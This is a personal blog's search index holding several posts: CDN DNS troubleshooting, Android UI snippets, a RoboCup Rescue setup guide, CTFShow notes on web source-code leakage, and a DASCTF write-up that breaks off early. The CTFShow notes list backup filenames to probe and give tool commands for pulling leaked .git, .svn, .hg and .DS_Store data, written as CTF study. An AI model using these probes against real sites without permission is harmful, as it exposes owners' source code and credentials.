<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>阿里云CDN加速域名解析冲突问题</title>
    <url>/2020/10/11/ALi/</url>
    <content><![CDATA[<p>自己的个人博客搭建了也有一段时间了，以前部署在Gitee上访问速度还行，后来部署到GitHub后速度是一天不如一天了，于是想看看能不能加速一下，看了看网上的做法，我选择采用CDN加速域名。</p>
<p>首先，你需要将域名进行备案，备案完成后才能进行后续操作。</p>
<p>然后我选择的是阿里云的CDN（腾讯云貌似有6个月的免费试用，但是由于我是阿里云的域名，去腾讯云搞又得在那边域名备案，就放弃了）</p>
<p>前面按照网上的步骤走都没啥问题，但当进行到向域名解析中添加一条CNAME记录时显示与A解析冲突（<strong>A解析是当初绑定域名的时候添加的</strong>），我看了看阿里云提供的Tip，但是我还是不太明白怎么操作，尝试将原来的A解析删除，换成CNAME，换完发现我的博客直接502了。后来联系阿里云客服才将问题解决。</p>
<p>如果你也出现了同样的问题，首先，你检查一下你将顶级域名添加到CDN时设置的源站IP是不是A解析记录里的那个IP（我犯的错是将源站IP设置成了阿里云服务器的IP），如果不是，改过来，然后删除A解析，添加CNAME解析（CNAME解析的添加根据提示做就行了），然后就大功告成了。</p>
<hr>
<p>u1s1,阿里云的客服态度蛮好的，晚上10点多了还为我耐心解答问题，在此致谢！</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>CDN 解析冲突</tag>
      </tags>
  </entry>
  <entry>
    <title>Android</title>
    <url>/2021/03/17/Android/</url>
    <content><![CDATA[<h4 id="1-边框圆角化"><a href="#1-边框圆角化" class="headerlink" title="1.边框圆角化"></a>1.边框圆角化</h4><pre><code class="line-numbers language-java">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;shape
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle"&gt;
    &lt;!-- 填充的颜色 --&gt;
    &lt;solid android:color="#EEB422" /&gt;
    &lt;!-- android:radius 弧形的半径 --&gt;
    &lt;!-- 设置按钮的四个角为弧形 --&gt;
    &lt;corners
        android:radius="20dip" /&gt;
    &lt;!--也可单独设置--&gt;
    &lt;!-- &lt;corners --&gt;
    &lt;!-- android:topLeftRadius="10dp"--&gt;
    &lt;!-- android:topRightRadius="10dp"--&gt;
    &lt;!-- android:bottomRightRadius="10dp"--&gt;
    &lt;!--  android:bottomLeftRadius="10dp"--&gt;
    &lt;!--   /&gt;  --&gt;
    **设置文字padding**
    &lt;!-- padding：Button里面的文字与Button边界的间隔 --&gt;
    &lt;padding
        android:left="5dp"
        android:top="3dp"
        android:right="5dp"
        android:bottom="3dp"
        /&gt;
&lt;/shape&gt;
</code></pre>
<h4 id="2-背景颜色渐变"><a href="#2-背景颜色渐变" class="headerlink" title="2.背景颜色渐变"></a>2.背景颜色渐变</h4><pre><code class="line-numbers language-java">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;shape xmlns:android="http://schemas.android.com/apk/res/android"&gt;
    &lt;!--实现应用背景颜色渐变--&gt;
    &lt;gradient
        android:startColor="#FFF8DC"
        android:endColor="#FFE1FF"
        android:angle="270"/&gt;
    &lt;corners
        android:radius="20dip"
        android:topLeftRadius="0dp"
        android:topRightRadius="0dp"/&gt;
&lt;/shape&gt;
</code></pre>
<h4 id="3-Button背景色修改无效"><a href="#3-Button背景色修改无效" class="headerlink" title="3.Button背景色修改无效"></a>3.Button背景色修改无效</h4><p>找到main/res/values/themes.xml文件</p>
<p>将其中的<code>&lt;style name="Theme.MyRegistration" parent="Theme.MaterialComponents.DayNight.DarkActionBar"&gt;</code></p>
<p>修改为<code>&lt;style name="Theme.MyRegistration" parent="Theme.MaterialComponents.DayNight.DarkActionBar.Bridge"&gt;</code>即可</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术学习</category>
      </categories>
      <tags>
        <tag>Android UI</tag>
      </tags>
  </entry>
  <entry>
    <title>ROBOCUP RESCUE 示例代码演示</title>
    <url>/2022/03/20/Apollo/</url>
    <content><![CDATA[<p>用于记录给学弟学妹们讲解简单的运行服务器和挂载智能体的知识</p>
<h3 id="一、VMware的安装"><a href="#一、VMware的安装" class="headerlink" title="一、VMware的安装"></a>一、VMware的安装</h3><p>方法一：去官网下载，然后去网上找相关的许可证</p>
<p>方法二：<a href="http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd">http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd</a></p>
<p>（微信公众号里的资源）</p>
<h3 id="二、Ubuntu的安装"><a href="#二、Ubuntu的安装" class="headerlink" title="二、Ubuntu的安装"></a>二、Ubuntu的安装</h3><blockquote>
<p>建议直接使用我发在群里的迅雷链接下，那样会快很多。</p>
</blockquote>
<p>下面两个方法只是给出作为参考，不建议使用，如果使用记得看好版本，下载<strong>Ubuntu18.04</strong>.</p>
<p>方法一：Ubuntu官网：</p>
<p><a href="https://cn.ubuntu.com/?_ga=2.176887340.845118543.1645454480-1361094071.1630542545">企业开源和Linux | Ubuntu</a>（中文站）</p>
<img src="/2022/03/20/Apollo/image-20220222144723106.png" alt="image-20220222144723106" style="zoom:33%;">

<blockquote>
<p>切记选择桌面系统，不要去选服务器版，服务器版没有图形界面</p>
</blockquote>
<p>方法二：清华镜像源</p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/#">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
<img src="/2022/03/20/Apollo/image-20220222144944607.png" alt="image-20220222144944607" style="zoom:33%;">

<img src="/2022/03/20/Apollo/image-20220222145131330.png" alt="image-20220222145131330" style="zoom: 33%;">

<h3 id="三、Ubuntu虚拟机的创建"><a href="#三、Ubuntu虚拟机的创建" class="headerlink" title="三、Ubuntu虚拟机的创建"></a>三、Ubuntu虚拟机的创建</h3><p>相关的教程网上有许多，可相互参考着来，找了几篇供大家参考(18.04与20.04的安装过程差不多，也可以作为参考)</p>
<p><a href="https://www.jb51.net/article/187313.htm">VMware15虚拟机安装Ubuntu18.04的图文教程_VMware_脚本之家 (jb51.net)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/355314438">史上最全最新Ubuntu20.04安装教程（图文） - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.cnblogs.com/ubuntuanzhuang/p/12934044.html">ubuntu20.04安装教程,ubuntu详细安装教程20.04 - ubuntu安装配置教程 - 博客园 (cnblogs.com)</a></p>
<p><strong>【注意】</strong>:<font color="red">考虑到以后运行服务器时的速度，建议在安装时将内存尽量选大一点，电脑允许的话选择4096MB或者更高吧。磁盘大小的话选择40G或者更大。</font></p>
<img src="/2022/03/20/Apollo/image-20220318203527795-16512372663262.png" alt="image-20220318203527795" style="zoom: 50%;">

<img src="/2022/03/20/Apollo/image-20220318203601453-16512372663261.png" alt="image-20220318203601453" style="zoom: 50%;">

<p>安装完成后进入Ubuntu（我这里演示用的是Ubuntu２１，所以界面看起来可能不太一样）</p>
<img src="/2022/03/20/Apollo/image-20220222150520871.png" alt="image-20220222150520871" style="zoom:33%;">

<blockquote>
<p>为了操作便捷，建议再安装一下vmware tools，可以参考下面那个链接中的方式安装，也可以自己百度一些其他的博客。关于如何知道是否安装成功vmware tools，可以尝试将自己主机中的一个txt文档拖拽进 Ubuntu中（拖进某个文件夹，直接拖到桌面好像不行），如果可以的话说明vmware tools已经安装好了。</p>
</blockquote>
<p><a href="https://www.cnblogs.com/VagueCheung/p/13535687.html">VMware虚拟机安装Ubuntu18.04教程（图文） - VagueCheung - 博客园 (cnblogs.com)</a></p>
<h3 id="四、配置相关环境"><a href="#四、配置相关环境" class="headerlink" title="四、配置相关环境"></a>四、配置相关环境</h3><h4 id="JDK的安装"><a href="#JDK的安装" class="headerlink" title="JDK的安装"></a>JDK的安装</h4><p>桌面右键，选择打开终端，使用命令<code>sudo apt install openjdk-17-jdk</code>安装JDK１７</p>
<img src="/2022/03/20/Apollo/image-20220318204516525-16512372663263.png" alt="image-20220318204516525" style="zoom: 67%;">

<blockquote>
<p>如果这里下载的速度很慢，只有十几kb/s，那么建议<strong>换源</strong></p>
<p>一篇讲的很清楚的换源教程：</p>
<p><a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">Linux]Ubuntu 20.04换阿里源_wangyijieonline的博客-CSDN博客_ubuntu 阿里源</a></p>
</blockquote>
<p>在安装完成后再次输入 <code>java -version</code> 和 <code>javac -version</code>，出现相应的版本号即安装成功</p>
<img src="/2022/03/20/Apollo/image-20220318204617743-16512372663264.png" alt="image-20220318204617743" style="zoom:67%;">

<h4 id="Git与Gradle的安装："><a href="#Git与Gradle的安装：" class="headerlink" title="Git与Gradle的安装："></a>Git与Gradle的安装：</h4><p>在终端输入 <code>gradle -version</code>尝试查看gradle版本，未安装的情况下会提示命令找不到，然后会提示你相关的安装命令（类似这种 <code>sudo apt-get install gradle</code> ），复制下来回车安装即可（因为我在演示前已经安装了，此处直接显示的就是gradle版本号了，你们按照提示安装即可）。</p>
<p>git的安装与gradle类似，都是先尝试查看版本号，然后根据提示安装。</p>
<img src="/2022/03/20/Apollo/image-20220318212528084-16512372663265.png" alt="image-20220318212528084" style="zoom: 67%;">

<h3 id="五、服务器的运行"><a href="#五、服务器的运行" class="headerlink" title="五、服务器的运行"></a>五、服务器的运行</h3><h4 id="1-下载压缩包"><a href="#1-下载压缩包" class="headerlink" title="1.下载压缩包"></a>1.下载压缩包</h4><p>在Home目录下（或者其他位置）新建一个文件夹Apollo，然后将服务器和示例代码压缩包复制进来，压缩包没有的可以去下面这个链接自取</p>
<p>链接：<a href="https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA">https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA</a><br>提取码：rcrs</p>
<img src="/2022/03/20/Apollo/image-20220318205716154-16512372663266.png" alt="image-20220318205716154" style="zoom:67%;">

<p>可以先下载到windows主机，然后将整个压缩包复制到虚拟机中。</p>
<p>然后右键“提取到此处”进行解压缩</p>
<img src="/2022/03/20/Apollo/image-20220318210150116-16512372663267.png" alt="image-20220318210150116" style="zoom:67%;">

<p>继续将里面的两个压缩包解压缩，得到如下两个文件夹。</p>
<img src="/2022/03/20/Apollo/image-20220318210259946-16512372663268.png" alt="image-20220318210259946" style="zoom:67%;">

<h4 id="2-服务器的运行"><a href="#2-服务器的运行" class="headerlink" title="2.服务器的运行"></a>2.服务器的运行</h4><p>首先进入rcrs-server-master文件夹，右键打开终端，输入指令进行编译：</p>
<pre><code>./gradlew completeBuild
</code></pre>
<img src="/2022/03/20/Apollo/image-20220318210442941-16512372663279.png" alt="image-20220318210442941" style="zoom: 50%;">

<p>编译成功后终端会显示 BUILD SUCESSFULLY</p>
<img src="/2022/03/20/Apollo/image-20220318210624211-165123726632710.png" alt="image-20220318210624211" style="zoom:50%;">

<p>接着输入以下指令来进入scripts文件夹：(cd是进入某个文件夹的命令，可以自己去了解了解<strong>Linux常用命令</strong>)</p>
<pre><code>cd scripts
</code></pre>
<p>然后使用以下指令启动服务器：</p>
<pre><code>bash start.sh -m ../maps/test/map -c ../maps/test/config
</code></pre>
<blockquote>
<p>start.sh是一个用来启动的脚本，bash是执行这个脚本的命令</p>
<p><strong>-m</strong> 用来指定地图  ..是指的父目录（上一级目录，即rcrs-server-master文件夹，因为前面用 cd scripts命令进入了该目录下的scripts文件夹） ../maps/test/map 指的就是上一级目录中的maps、test/map,大家可以自己在文件夹里点进去看看，确实存在的</p>
<p><strong>-c</strong> 用来指定地图配置文件 ../maps/test/config 大家也可以自己去找一下看看，也确实存在</p>
</blockquote>
<img src="/2022/03/20/Apollo/image-20220318210755610-165123726632711.png" alt="image-20220318210755610" style="zoom:50%;">

<p>命令执行后等待一会儿服务器就会成功启动，如下图所示：</p>
<img src="/2022/03/20/Apollo/image-20220318210936867-165123726632712.png" alt="image-20220318210936867" style="zoom:50%;">



<h4 id="3-智能体的挂载"><a href="#3-智能体的挂载" class="headerlink" title="3.智能体的挂载"></a>3.智能体的挂载</h4><p>服务器启动成功后就要把相关的智能体挂载上去，可以理解为把我们写好的代码连接上服务器，让它能够去控制智能体的行动。</p>
<p>首先不要关闭之前的终端，也不要关闭服务器。Ctrl+D回到桌面，进入之前解压缩好的adf-sample-agent-java文件夹，然后右键进入终端，输入以下命令：</p>
<pre><code>./gradlew clean
</code></pre>
<pre><code>./gradlew build
</code></pre>
<p>然后就会对代码进行编译，编译成功后的界面如下图所示：</p>
<img src="/2022/03/20/Apollo/image-20220318211123118-165123726632714.png" alt="image-20220318211123118" style="zoom:50%;">

<p>然后使用以下命令挂载智能体：</p>
<pre><code>bash launch.sh -all
</code></pre>
<img src="/2022/03/20/Apollo/image-20220318211226261-165123726632713.png" alt="image-20220318211226261" style="zoom: 67%;">

<p>终端会显示成功挂载的智能体数量，如下图所示则为挂载成功：</p>
<img src="/2022/03/20/Apollo/image-20220318211409355-165123726632717.png" alt="image-20220318211409355" style="zoom: 67%;">

<p>进度条会一直卡在75%，这时去之前开启的服务器，可以直接点击左侧的图标，进到服务器后直接点Run，然后就能开始跑图。</p>
<img src="/2022/03/20/Apollo/image-20220318211530508-165123726632716.png" alt="image-20220318211530508" style="zoom: 50%;">

<p>如下图所示，Time指的是回合数，Score指的是分数。</p>
<img src="/2022/03/20/Apollo/image-20220318211704356-165123726632715.png" alt="image-20220318211704356" style="zoom: 67%;">

<p>运行后的两个终端状况如下图所示</p>
<img src="/2022/03/20/Apollo/image-20220318211754595-165123726632718.png" alt="image-20220318211754595" style="zoom:50%;">

<p>等到图跑结束后进到服务器那个终端，按<code>Ctrl+C</code>结束运行，并执行 <code>bash kill.sh</code> 彻底杀死进程。</p>
<img src="/2022/03/20/Apollo/image-20220318211856078-165123726632719.png" alt="image-20220318211856078" style="zoom:67%;">

<p>然后在adf-sample-agent-java文件夹中用Ctrl+C结束智能体的挂载，结束后的两个终端如下图所示：</p>
<img src="/2022/03/20/Apollo/image-20220318211925792-165123726632720.png" alt="image-20220318211925792" style="zoom:67%;">

<p>到此结束！</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFShow刷题小结(信息搜集)</title>
    <url>/2020/10/15/CTFShow%E5%88%B7%E9%A2%98%E5%B0%8F%E7%BB%93(%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)/</url>
    <content><![CDATA[<p>划了好久的水了，恰巧最近空余时间还算多，就开始刷CTFshow 上的web入门</p>
<span id="more"></span>

<h3 id="web源码泄露"><a href="#web源码泄露" class="headerlink" title="web源码泄露"></a>web源码泄露</h3><p>印象比较深的是源码泄露的几道题，之前偶尔碰到过，今天才知道是源码泄露。</p>
<p>搬运自：<a href="https://blog.csdn.net/Fly_hps/article/details/82821857?utm_source=blogxgwz7">https://blog.csdn.net/Fly_hps/article/details/82821857?utm_source=blogxgwz7</a></p>
<h4 id="vim临时文件"><a href="#vim临时文件" class="headerlink" title="vim临时文件"></a>vim临时文件</h4><p> 程序员使用vim编辑器编写一个<code>index.php</code>文件时，会有一个<code>.index.php.swp</code>文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p>
<h4 id="恢复文件"><a href="#恢复文件" class="headerlink" title="恢复文件"></a>恢复文件</h4><blockquote>
<p>vim -r 恢复的文件名<br>前提是.index.php.swp存在于该目录下</p>
</blockquote>
<h4 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h4><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带<code>~</code>的备份文件，某些情况下可以对其下载进行查看；</p>
<blockquote>
<p>以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p>
</blockquote>
<p><strong>漏洞利用</strong>：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。</p>
<h4 id="PHPSTORM"><a href="#PHPSTORM" class="headerlink" title="PHPSTORM"></a>PHPSTORM</h4><p>使用phpstorm新建项目时，会生成一个<code>.idea</code>文件夹，这个文件夹有一个<code>workspace.xml</code>，访问可以得到一些信息。</p>
<h4 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h4><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<p><strong>漏洞成因及危害</strong></p>
<p>该漏洞的成因主要有以下两种：</p>
<blockquote>
<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
</blockquote>
<p><strong>漏洞检测</strong></p>
<p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
<p><strong>常见备份压缩文件</strong></p>
<blockquote>
<p>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p>
</blockquote>
<p><strong>常见备份文件后缀：</strong></p>
<pre><code>.index.php.swp
index.php.swp
index.php.bak
.index.php~
index.php.bak_Edietplus
index.php.~
index.php.~1~
index.php
index.php~
index.php.rar
index.php.zip
index.php.7z
index.php.tar.gz
www.zip
www.rar
www.zip
www.7z
www.tar.gz
www.tar
web.zip
web.rar
web.zip
web.7z
web.tar.gz
web.tar
wwwroot.rar
web.rar
</code></pre>
<p><strong>漏洞利用</strong>：使用disearch扫描</p>
<blockquote>
<p>python dirsearch.py -u url -e *</p>
</blockquote>
<h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h4><p>git在初始化项目的时候, 会在项目的根目录(可用<code>git rev-parse --show-toplevel</code>查看)创建一个名为<code>.git</code>的隐藏文件夹, 里面包含了本地所有commit的历史记录. 如果无意间将这个目录置于WEB的路径下让用户可以访问,那么这也就泄露了几乎所有的源代码和其他其他敏感信息.</p>
<p>该文件可以来恢复源代码</p>
<p><strong>fuzz：</strong></p>
<pre><code>http://url/.git/config
</code></pre>
<p>若存在该页面，可以看到配置信息，说明存在该漏洞</p>
<p><strong>漏洞利用：</strong></p>
<p>工具：<a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
<pre><code>python GitHack.py http://url/.git/
</code></pre>
<blockquote>
<p>git log可以查看提交历史<br>git diff查看git提交的不同处<br>stash命令可用于临时保存和恢复修改，可跨分支<br>git stash list查看所有保存的记录列表<br>git stash pop，从 git 栈中弹出来一个文件</p>
</blockquote>
<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<pre><code>rip-hg.pl -v -u http://url/.git
</code></pre>
<h4 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h4><p>与git类似, hg在初始化项目时, 会在项目的根目录下创建一个名为<code>.hg</code>的隐藏文件夹,里面包含了代码和分支的修改记录和开发人员的相关信息. 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
<pre><code>http://www.example.com/.hg/
</code></pre>
<p><strong>fuzz：</strong></p>
<pre><code>http://url/.hg/
</code></pre>
<p><strong>漏洞利用：</strong></p>
<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<pre><code>rip-hg.pl -v -u http://url/.hg
</code></pre>
<h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p>svn同样在项目根目录下会创建一个名为<code>.svn</code>的<strong>隐藏文件夹</strong>, 包含了所有分支commit信息和代码记录.</p>
<h4 id="fuzz："><a href="#fuzz：" class="headerlink" title="fuzz："></a>fuzz：</h4><pre><code>http://url/.svn/entries
</code></pre>
<p><strong>漏洞利用：</strong></p>
<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<pre><code>rip-svn.pl -v -u http://www.example.com/.svn/
</code></pre>
<h4 id="bzr-Bazaar泄露"><a href="#bzr-Bazaar泄露" class="headerlink" title="bzr/Bazaar泄露"></a>bzr/Bazaar泄露</h4><p>bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为<code>.bzr</code>的<strong>隐藏目录</strong>, 同样暴露了源代码和用户信息.</p>
<p><strong>漏洞利用：</strong></p>
<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/
</code></pre>
<h4 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a><strong>CVS泄漏</strong></h4><p>cvs项目在初始化(cvs checkout <code>project</code>)的时候, 会在<code>project</code>目录下创建一个名为<code>CVS</code>的目录,<br>其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本. 其中两个关键文件为:<br><code>CVS/Root</code>和<code>CVS/Entries</code>, 分别记录了项目的根信息和所有文件的结构</p>
<p><strong>fuzz</strong></p>
<pre><code>http://url/CVS/Root 返回根信息
http://url/CVS/Entries 返回所有文件的结构
</code></pre>
<p><strong>漏洞利用</strong></p>
<p>取回源码的命令，这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
<pre><code>bk clone http://url/name dir
</code></pre>
<p>查看所有的改变的命令，转到download的目录</p>
<pre><code>bk changes
</code></pre>
<h4 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，则有可能会造成文件泄露</p>
<p><strong>fuzz：</strong></p>
<pre><code>http://url/.DS_Store
</code></pre>
<p><strong>漏洞利用：</strong></p>
<p>工具：<a href="https://github.com/lijiejie/ds_store_exp">dsstoreexp</a></p>
<pre><code>python ds_store_exp.py http://url/.DS_Store
</code></pre>
<h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<ul>
<li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
<li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
<li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li>
<li><code>/WEB-INF/database.properties</code>：数据库配置文件漏洞检测以及利用方法</li>
</ul>
<h4 id="漏洞检测以及利用方法"><a href="#漏洞检测以及利用方法" class="headerlink" title="漏洞检测以及利用方法"></a>漏洞检测以及利用方法</h4><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
<pre><code>http://url/WEB-INF/web.xml
</code></pre>
<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://0clickjacking0.github.io/2019/04/17/web%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/">https://0clickjacking0.github.io/2019/04/17/web常见源码泄露/</a><br><a href="https://www.secpulse.com/archives/55286.html">https://www.secpulse.com/archives/55286.html</a><br><a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html">WEB中的敏感文件泄漏</a></p>
<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>web18中新接触到了一种新的编码，unicode，其特征为：\uxxxx</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF 《Ezfileinclude》 wp</title>
    <url>/2020/07/25/DASCTF/</url>
    <content><![CDATA[<p>今天第一次参加CTF比赛，对于我这个菜鸡来说，简直毫无比赛体验<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span>，遭受了五个小时的吊打。</p>
<p><img src="/2020/07/25/DASCTF/image-20200725170156404.png" alt="image-20200725170156404"></p>
<p>没错，就是这么残忍。直接把我0封了。<img src="/2020/07/25/DASCTF/image-20200725180746269.png" alt="image-20200725180746269"></p>
<img src="/2020/07/25/DASCTF/image-20200725180804349.png" alt="image-20200725180804349" style="zoom:67%;">

<p>后来在大佬的反复提示帮助之下，勉强解出第一题《Ezfileinclude》,下面记录一下自己的挨打历程。</p>
<p>打开靶机，页面显示的是一张图片<img src="/2020/07/25/DASCTF/image-20200725180822011.png" alt="image-20200725180822011" style="zoom:67%;"></p>
<p>查看源码，没太多有用的信息，唯一比较特殊的话是这找图片的url:<code>**image.php?t=1595643210&amp;f=Z3F5LmpwZw==**</code></p>
<p>看到f=后面那一串东西，一下子想到了base64编码，尝试解一波码，解出来<code>gqy.jpg</code>，先留着，说不定有用。</p>
<p>试了一下image.php,回显：<strong>you miss some parameters</strong>（你漏掉了一些参数）奥，可能后面的t,f也得跟着，复制粘贴上去，再回车，页面回显：<strong>what’s your time ?</strong></p>
<p>作为一个萌新，我一度怀疑这是不是什么CTF黑话，特意百度了一波 <em><strong>CTF what’s your time?</strong></em>  好吧，并不是，想了想，可能是要给time这个参数赋值，盲猜可能是URL中的t参数，试着把t参数删掉，回车，回显提醒漏掉参数，给t赋值为time试试？还是问我时间！<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8">😩</span>但是时间一直是变化的呀，，，怎么搞呢？关键在于那个t后面的一串数字是啥，我又去百度了一波CTF中的数字编码，没啥结果。卡住。</p>
